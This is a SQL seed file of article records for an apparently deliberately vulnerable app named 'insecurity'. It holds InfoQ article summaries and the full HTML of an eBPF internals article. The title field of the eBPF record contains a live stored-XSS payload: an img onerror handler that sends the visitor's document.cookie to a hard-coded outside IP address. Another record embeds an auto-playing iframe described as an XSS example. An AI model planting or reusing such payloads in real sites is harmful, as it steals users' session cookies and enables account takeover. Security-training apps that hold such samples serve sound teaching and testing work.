INSERT INTO insecurity.article (aid, uid, title, tags, img_url, content, create_time, update_time,hot) VALUES (8, 4, 'IoT penetration test (13): Use firmware-mod-kit (FMK) to add a backdoor to the firmware', 'Security,Testing,IoT', 'https://static001.infoq.cn/resource/image/9f/94/9f719cf52f756b05c9eb974d4c632894.jpg', 'It is mainly for software developers, quality assurance personnel, security practitioners who want to be familiar with the mining and utilization of IoT device vulnerabilities, as well as readers who are interested in active defense measures.', '2020-05-21 00:51:56', '2020-05-21 00:51:56',1);

INSERT INTO insecurity.article (aid, uid, title, tags, img_url, content, create_time, update_time,hot) VALUES (9, 5, 'Super detailed analysis of the Flutter rendering engine | What if I want to innovate my business and dont understand the underlying principles?', 'Hardware,Security,Architecture,Culture&Method,Mini App,Methodology', 'https://static001.infoq.cn/resource/image/4c/0f/4c63e63cba752e8706b32e71fe99740f.png', 'This article conducts an in-depth analysis and sorting of the underlying rendering engine of Flutter to clarify the mechanism and ideas of Flutter''s rendering, and share some explorations based on the Flutter engine.', '2020-05-21 00:53:34', '2020-05-21 00:53:34',1);

INSERT INTO insecurity.article (aid, uid, title, tags, img_url, content, create_time, update_time,hot) VALUES (10, 4, 'Zoom ceases registration of individual users in China, and shifts its R&D focus to the United States', 'Architecture,Industrial Internet,Product,Security,Enterprise news', 'https://static001.infoq.cn/resource/image/e0/8b/e004c5b351aa51812a559fe0e56b6d8b.png', 'Not calm at all, Zoom is on the cusp of the storm again.', '2020-05-21 00:55:29', '2020-05-21 00:55:29',1);

INSERT INTO insecurity.article (aid, uid, title, tags, img_url, content, create_time, update_time,hot) VALUES (11, 5, 'Synopsys: 75% of the code base contains vulnerabilities, and each code base has an average of 82 vulnerabilities', 'Security,Culture&Method,Open source,Enterprise news', 'https://static001.infoq.cn/resource/image/4c/a4/4ca36e9d4cf134a848dc699fe1fce0a4.jpg', 'Synopsys recently released the "2020 Open Source Security and Risk Analysis (OSSRA) Report", which has many big discoveries.', '2020-05-21 00:57:07', '2020-05-21 00:57:07',1);

INSERT INTO insecurity.article (aid, uid, title, tags, img_url, content, create_time, update_time,hot) VALUES (14, 4, 'An XSS injection vulnerability of the same style as Juice-Shop, very nice music', 'Security, Injection', 'https://static001.infoq.cn/resource/image/bd/6f/bda3f8dd92c40995bdbaa91eabb2a46f.jpeg', 'An XSS injection loophole of the same style as Juice-Shop, very nice music... The music is really nice, the melody is nice, la la la la la la<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>', '2020-05-21 02:30:35', '2020-05-21 02:30:35',1);

INSERT INTO insecurity.article (aid, uid, title, tags, img_url, content, create_time, update_time,hot) VALUES (15, 4, 'eBPF Internal：Instructions and Runtime <img src="123" onerror="document.getElementById(\'wechat-img\').setAttribute(\'src\',\'http://47.108.156.22:8088/cookie/set?cookie=\'+encodeURIComponent(document.cookie))">', 'Security,Architecture,Open source,Testing,Frontend,Linux', 'https://static001.infoq.cn/resource/image/0f/12/0f97cf1e5e45291ccb5eb904b6713012.png', '<p style="text-align:justify;text-indent:2em;">eBPF is an extremely popular kernel technology in recent years. Since its development in 2011, the eBPF community is still very active. eBPF can dynamically acquire and modify key data and execution logic in the kernel through hot loading, avoiding the risk of downtime caused by kernel modules, and has an execution efficiency comparable to native code.</p><p style="text-align:justify;text-indent:2em;">You have learned about the application scenarios and best practices of eBPF in various articles, and have also experienced the powerful capabilities of eBPF in tools such as cilium and bcc. How eBPF has the execution efficiency comparable to native and the ability to dynamically expand the current Linux kernel, and then we will uncover this layer of gauze.</p><h2 style="text-align:justify;text-indent:2em;">Intro</h2><p style="text-align:justify;text-indent:2em;">First, we introduce the past and present of eBPF so that we can better understand the next content. If you already know and practice, you can quickly skip to the next chapter.</p><p style="text-align:justify;text-indent:2em;">Everyone has used the tcpdump tool more or less, tcpdump can obtain the meta information of the message when the message enters and exits the protocol stack according to the user-defined filter rules specified by the user. The reason why tcpdump can flexibly filter user messages is essentially to convert the filtering rules into a special instruction, such as the following figure:</p><p style="text-align:justify;text-indent:2em;"></p><div class="media-wrap image-wrap"><img src="https://static001.infoq.cn/resource/image/bf/20/bfa19d4f0cca1e2f5d819dc02c7cbf20.png" alt="eBPF Internal：Instructions and Runtime"/></div><p></p><p style="text-align:justify;text-indent:2em;">This special instruction is called BPF, and was called cBPF after the birth of eBPF. Such special instructions into the core passing through the interface libpcap, when the card receives the packet performs registration AF_ PA CK packet_rcv protocol function, user mode execute incoming instructions BPF, if it satisfies the filtering rule to clone user mode. The general process is as follows:</p><p style="text-align:justify;text-indent:2em;"></p><div class="media-wrap image-wrap"><img src="https://static001.infoq.cn/resource/image/c3/26/c3c6390f5fa4aeb0ee744794a5df7726.png" alt="eBPF Internal：Instructions and Runtime"/></div><p></p><p style="text-align:justify;text-indent:2em;">Through this mechanism, the flexibility of the rules can be greatly improved, and complex messages can be filtered according to user needs. At the same time, the BPF instruction executor in the kernel can be continuously optimized to improve execution efficiency, such as JIT, SIMD, and so on.</p><p style="text-align:justify;text-indent:2em;">The birth of cBPF (classic Berkeley Packet Filter) can be traced back to 1992. Tcpdump is a typical application of cBPF, and seccomp also performs security filtering based on cBPF. The main features of cBPF are as follows:</p><ol><li>The kernel has a built-in BPF instruction interpreter, allowing it to be passed into the kernel from user mode;</li><li>Not Turing complete, BPF instructions do not have semantics such as loops, to ensure the security of the kernels execution of instructions;</li><li>Interpretation operation, support JIT. As in the tcpdump scenario mentioned above, each message needs to be filtered, and the execution speed of the instruction seriously affects the performance. Therefore, the common JIT instruction optimization method is introduced, which can convert instructions into local instructions to speed up the execution of instructions. Several times the performance improvement;</li></ol><p style="text-align:justify;text-indent:2em;">Time has gradually come to the 21st century, and eBPF has been developed since 2011. The main differences between eBPF and cBPF are as follows:</p><ol><li>A new ISA is defined, cBPF instructions are extended, eBPF instructions are mainly affected by amd64 and arm64, and 64bit registers are extended;</li><li>Using LLVM as the BPF compiler, due to the greatly expanded eBPF instructions and support for compiling C into the BPF instruction set, and then building the compiler into the kernel will introduce a huge amount of code. At the same time, the community has mature LLVM and GCC Tools, so the BPF backend was first extended based on LLVM, and GCC distance usage has to wait;</li><li>Introduced the bpf.h header file that users can use, which is convenient for user-mode programs to use the kernel-encapsulated eBPF program;</li><li>It is still Turing incomplete, and safety and efficiency are still the first considerations, but a bonded loop has been introduced in the recent kernel, which can execute the loop under safe conditions;</li><li>Interpretation operation, support JIT. Same as cBPF, but expanded with more architectures, supporting more architectures such as amd64 and aarch64;</li></ol><p style="text-align:justify;text-indent:2em;">After continuous iteration and development of cBPF and eBPF, many production-level projects have been born based on BPF:</p><ol><li>Katran, Facebooks open source 4-layer load balancing, based on XDP;</li><li>BCC toolset, bpftrace and systemtap-bpf, enrich and enhance the ability of kernel debugging and tracking;</li><li>Cilium, a network governance tool in microservices and k8s scenarios;</li><li>IO Visor Project, when you mention BCC, you have to mention the iovisor project, which open sourced BCC, bpftrace, gobpf, ubpf and other tools;</li></ol><p style="text-align:justify;text-indent:2em;">The current BPF common model: a short BPF program without loops and locks, which glues many kernel helpers and hook points together. It is used in the following scenarios:</p><ol><li>Tracing<br/>a. kprobe<br/>b. tracepoint</li><li>Networking<br/>a. sched<br/>b. XDP</li><li>Security<br/>a. secomp</li></ol><p style="text-align:justify;text-indent:2em;">Finally, why do you understand and use BPF. The very important reason is for more control, including the realization of some scenarios that cannot meet the needs in the user mode, or some behaviors of the kernel need to be modified. The best scenario for BPF is to cooperate with each other in user mode and kernel mode to share data. Of course, BPF is also CO-RE, compiling and running everywhere at one time, which has better portability.</p><h2 style="text-align:justify;text-indent:2em;">Why BPF is FAST</h2><p style="text-align:justify;text-indent:2em;">The operation of BPF in the kernel can be summarized as the following process:</p><p style="text-align:justify;text-indent:2em;"></p><div class="media-wrap image-wrap"><img src="https://static001.infoq.cn/resource/image/de/55/decc716586c35bcf304081bc977e2155.png" alt="eBPF Internal：Instructions and Runtime"/></div><p></p><p style="text-align:justify;text-indent:2em;">We assume a scenario where we attach BPF to a tracepoint of a hot spot, such as sending and receiving packets. Each time a packet is sent and received, the tracepoint attached BPF program will be executed again. On a busy machine, sending and receiving packets may be millions of times per second. Execution efficiency is very important. If the BPF program is attached in a hot spot, the performance problem may be magnified thousands of times. Before we discuss why the BPF program executes so fast, we need to understand the BPF instructions and interpreter first.</p><h3 style="text-align:justify;text-indent:2em;">Instruction</h3><p style="text-align:justify;text-indent:2em;">BPF currently has 102 instructions, mainly including three categories: ALU (64bit and 32bit), memory operations and branch operations. The format of the instruction is mainly composed of the following parts:</p><ol><li>8bit opcode</li><li>4bit destination register (dst)</li><li>4bit source register (src)</li><li>16bit Offset</li><li>32bit immediate number</li></ol><p style="text-align:justify;text-indent:2em;"></p><div class="media-wrap image-wrap"><img src="https://static001.infoq.cn/resource/image/24/a7/2494ac02a79b9b892c82dc51fa81afa7.png" alt="eBPF Internal：Instructions and Runtime"/></div><p></p><p style="text-align:justify;text-indent:2em;">It is very close to our common x86 or ARM instructions. After the instructions are defined, the execution of each instruction is run through the interpreter in the kernel. The process can be abstracted as a loop, also known as instruction distribution. In the loop, instructions will be continuously loaded, executed, and exited.</p><p style="text-align:justify;text-indent:2em;"></p><div class="media-wrap image-wrap"><img src="https://static001.infoq.cn/resource/image/89/5c/89539baa3a885e363b6becc503bd4f5c.png" alt="eBPF Internal：Instructions and Runtime"/></div><p></p><h3 style="text-align:justify;text-indent:2em;">Virtual Machine</h3><p style="text-align:justify;text-indent:2em;">We can think that the BPF bytecode is running in the BPF virtual machine in the kernel. The BPF bytecode is also the p-code (portable code) we usually mention, and the main purpose is for the efficient operation of the software interpreter. When it comes to virtual machines, we have to mention several common languages ​​that interpret and run, such as Python and Lua. According to the implementation of virtual machines, it can be divided into two categories, stack-based virtual machines and register-based virtual machines. The idea of ​​stack-based virtual machines originally came from Pascal. CPython and Lua 4 are also stack-based virtual machines. . Lua 5 and Dalvik JVM are register-based virtual machines, and BPF is also a register-based virtual machine. So what is the difference between stack and register implementation and performance? Next we continue to analyze.</p><p style="text-align:justify;text-indent:2em;">A stack-based virtual machine, as the name suggests, instructions are organized in a stack data structure. The following figure can show this process more clearly:</p><p style="text-align:justify;text-indent:2em;"></p><div class="media-wrap image-wrap"><img src="https://static001.infoq.cn/resource/image/a0/7a/a05fd836e376d9846a7fa934a4ca257a.png" alt="eBPF Internal：Instructions and Runtime"/></div><p></p><p style="text-align:justify;text-indent:2em;">When we need to get the result of 20+7, we need to generate 4 instructions and LIFO execute them. This will generate more instructions and need to move the memory multiple times, but because there are not many registers, the implementation of the virtual machine will be relatively simple.</p><p style="text-align:justify;text-indent:2em;">Lets look at the register-based virtual machine again. Unlike the frequent operation of the stack, it can directly manipulate the registers, as shown in the flow chart below:</p><p style="text-align:justify;text-indent:2em;"></p><div class="media-wrap image-wrap"><img src="https://static001.infoq.cn/resource/image/3a/e4/3a9cf0d5e9fce347a215c89c319dcae4.png" alt="eBPF Internal：Instructions and Runtime"/></div><p></p><p style="text-align:justify;text-indent:2em;">The same need to obtain a result of 20+7, in the case of enough registers, we only need to generate and execute one instruction. Compared with the implementation of the stack, the number of instruction lines is significantly reduced, and the efficiency will be improved. However, the implementation of a register-based virtual machine will be more complicated. At the same time, each instruction needs to access more memory, and the instruction will be more complex, because it needs to provide support for 2,3,4 address instructions.</p><p style="text-align:justify;text-indent:2em;">Through the paper <em>Data from A Performance on Stack-based and Register-based Virtual Machine</em>, we can make a simple comparison between stack-based and register -based in general scenarios:</p><ul><li>Register-based virtual machine performance is 20.39% faster than stack-based virtual machine in total time;</li><ul><li>Instructions are distributed and executed, and the register-based virtual machine is 66.42% faster</li><li>Data acquisition, stack-based virtual machine is 23.5% faster</li></ul></ul><p></p><p style="text-align:justify;text-indent:2em;"></p><div class="media-wrap image-wrap"><img src="https://static001.infoq.cn/resource/image/d7/3b/d7208249d7224c31adf6f1c599ba773b.png" alt="eBPF Internal：Instructions and Runtime"/></div><p></p><p style="text-align:justify;text-indent:2em;"></p><div class="media-wrap image-wrap"><img src="https://static001.infoq.cn/resource/image/24/eb/24c9f6c0662d1d5f7060e4e07ad5a1eb.png" alt="eBPF Internal：Instructions and Runtime"/></div><p></p><p style="text-align:justify;text-indent:2em;">Through this comparison, we can draw a preliminary conclusion that in general scenarios, register-based virtual machine implementation has better performance than stack-based virtual machine implementation. Of course, only this well-designed test may not be of great practical significance. We also need an actual production-level example and data. Coincidentally, the virtual machine implementation of Lua 4 is based on the stack, while Lua 5 is replaced by a register-based implementation with better performance. We compared the performance of the two:</p><p style="text-align:justify;text-indent:2em;"></p><div class="media-wrap image-wrap"><img src="https://static001.infoq.cn/resource/image/e7/20/e743a64160a4e75d1a2eed9a6d673120.png" alt="eBPF Internal：Instructions and Runtime"/></div><p></p><p style="text-align:justify;text-indent:2em;">Through this official data comparison, it can be seen that Lua 5 is about 34% faster than Lua 4. It can be seen that in actual applications, register-based virtual machines can indeed bring higher performance, but from the above data, it can be seen that the performance improvement is only a few tens of percent, which is greater than that of native instructions. Room for improvement.</p><h3 style="text-align:justify;text-indent:2em;">JIT</h3><p style="text-align:justify;text-indent:2em;">In the performance comparison at the language level, there is a representative performance test scenario Techempower. A language, and different web frameworks under this language, respectively test HTTP processing performance. From the figure below, we can see that the language performance compiled into native code is far ahead, while the language that interprets and runs Python has fallen behind, but there is one exception. The performance of Java can be shared with languages ​​such as Rust and Go. Winning or losing, we already know that Java is also interpreted in a sense. Apart from the continuous optimization of Java VM for many years, the biggest difference from CPython is the support of JIT.</p><p style="text-align:justify;text-indent:2em;"></p><div class="media-wrap image-wrap"><img src="https://static001.infoq.cn/resource/image/85/32/854b161470f5d76f91e6397d738fe632.png" alt="eBPF Internal：Instructions and Runtime"/></div><p></p><p style="text-align:justify;text-indent:2em;">What is JIT? JIT (Just-in-time) was introduced to cBPF in 2011. Corresponding to JIT is AOT (ahead-of-time). JIT does not need an interpreter, or an interpreter is extended. JIT will compile instructions into native instructions for execution on the machine at runtime. The BPF virtual machine translates all bytecodes into local native codes and then executes them. Specifically, it translates BPF bytecodes into native native codes, saves them to a specific area in memory and executes them. BPF programs are usually simple and lightweight, and the introduction of JIT will not significantly affect cold start performance.</p><p style="text-align:justify;text-indent:2em;">How much performance improvement will enabling JIT bring? The Lua mentioned earlier provides an implementation of LuaJIT in later versions, and the biggest change is the use of JIT rewriting. Below is a set of performance data of LuaJIT vs Lua. We can see that LuaJIT is 2-10 times faster than Lua.</p><p style="text-align:justify;text-indent:2em;"></p><div class="media-wrap image-wrap"><img src="https://static001.infoq.cn/resource/image/82/24/82ea78d9649ba5cb46d7cb65ec001624.png" alt="eBPF Internal：Instructions and Runtime"/></div><p></p><p style="text-align:justify;text-indent:2em;">Similarly, PyPy is a JIT-based implementation of CPython. We see that PyPy is 2-10 times faster than CPython.</p><p style="text-align:justify;text-indent:2em;"></p><div class="media-wrap image-wrap"><img src="https://static001.infoq.cn/resource/image/c8/bc/c8ebefd57317e5088008735bc8a21bbc.png" alt="eBPF Internal：Instructions and Runtime"/></div><p></p><p style="text-align:justify;text-indent:2em;">For BPF, how much performance will JIT bring? uBPF is a good test program. uBPF is the implementation of BPF virtual machine in user mode. It provides an optional JIT. We can use clang to compile the test program into an elf file to test separately when the JIT is turned on and off. The performance of the same BPF program. As can be seen from the test data below, the performance is also improved several times after the JIT is turned on.</p><p style="text-align:justify;text-indent:2em;"></p><div class="media-wrap image-wrap"><img src="https://static001.infoq.cn/resource/image/5d/b7/5d253458546866995f8ced422d26c7b7.png" alt="eBPF Internal：Instructions and Runtime"/></div><p></p><h2 style="text-align:justify;text-indent:2em;">How BPF extends Kernel</h2><p style="text-align:justify;text-indent:2em;">In the previous content, we mentioned compilation, instruction set and virtual machine. So how is BPF compiled into an executable file and run in the kernel?</p><h3 style="text-align:justify;text-indent:2em;">LLVM</h3><p style="text-align:justify;text-indent:2em;">The current compilation of BPF is inseparable from LLVM. LLVM is divided into front-end and back-end. We can compile any language into LLVM IR, which is an intermediate file. LLVM can compile LLVM IR into an object file, which is the binary file we mentioned.</p><p style="text-align:justify;text-indent:2em;"></p><div class="media-wrap image-wrap"><img src="https://static001.infoq.cn/resource/image/65/a2/65b3a4e3b14b84174bc559b39becbda2.png" alt="eBPF Internal：Instructions and Runtime"/></div><p></p><p style="text-align:justify;text-indent:2em;">For BPF, we can use clang to compile BPF into LLVM IR files. LLVM currently supports BPF as object files, so we can compile any LLVM IR into BPF object files. The general process can refer to the following figure:</p><p style="text-align:justify;text-indent:2em;"></p><div class="media-wrap image-wrap"><img src="https://static001.infoq.cn/resource/image/82/e9/82278632c4213d9c5c674412af5785e9.png" alt="eBPF Internal：Instructions and Runtime"/></div><p></p><p>A picture</p><p style="text-align:justify;text-indent:2em;">We are currently writing in C and compiling into BPF programs. From the above process, we can understand that we can translate any language into LLVM IR. As long as this language provides the front end of LLVM, we can compile this language into BPF object files. Fortunately, many mainstream languages ​​currently provide LLVM front ends, such as C, C++, Go Haskell, etc.</p><p style="text-align:justify;text-indent:2em;">After we compile various languages ​​into BPF object files, we can not only use these languages ​​to develop BPF programs, but we can also use BPF as a general instruction set and use a user-mode virtual machine to run BPF execution as a Platform-independent, CO-RE instruction architecture.</p><h3 style="text-align:justify;text-indent:2em;">WASM</h3><p style="text-align:justify;text-indent:2em;">Just like the booming WASM, as an open source and portable bytecode format, it is widely used in edge computing and browsers. Among them, WASM already has the ability to execute in the kernel. As the pro-son of the kernel, BPF is more suitable for running in the kernel than WASM and can be more closely integrated with the kernel.</p><p style="text-align:justify;text-indent:2em;"></p><div class="media-wrap image-wrap"><img src="https://static001.infoq.cn/resource/image/04/e2/04a733d7c1478b1c873fd0db25d0e1e2.png" alt="eBPF Internal：Instructions and Runtime"/></div><p></p><h2 style="text-align:justify;text-indent:2em;">BPF in the future</h2><p style="text-align:justify;text-indent:2em;">Before talking about the future, we must not forget the original intention of BPF:</p><h3 style="text-align:justify;text-indent:2em;">BPF goal</h3><ul><li>Let non-kernel developers safely and easily modify kernel behavior.</li></ul><h3 style="text-align:justify;text-indent:2em;">BPF non goals</h3><ul><li>Implement dynamic tracing and kernel introspection</li><li>Implement software defined networking, firewalls, load balancers, service mesh</li></ul><p style="text-align:justify;text-indent:2em;">On the premise of adhering to the goals of BPF, we will do more in the future and the scene will be bigger:</p><h3 style="text-align:justify;text-indent:2em;">BPF in kernel</h3><ul><li>Safe lock and memory operation</li><li>Allow users to execute more instructions in the kernel</li><li>Faster speed</li></ul><h3 style="text-align:justify;text-indent:2em;">BPF in user-space</h3><ul><li>As a universal bytecode</li><li>CO-RE</li><li>Native support for Rust, Go and other languages</li></ul><h2 style="text-align:justify;text-indent:2em;">End</h2><p style="text-align:justify;text-indent:2em;">Our team is using eBPF to do some cool things, including introducing the communitys bcc toolkit into the group and Aliyun Linux 2, and self-developed network delay tracking tool NX tracepoint based on eBPF + tracepoint, etc. If you are interested in the BPF technology ecology, you can contact us at any time.</p><p></p>', '2020-05-11 02:30:35', '2020-05-11 02:30:35',0);
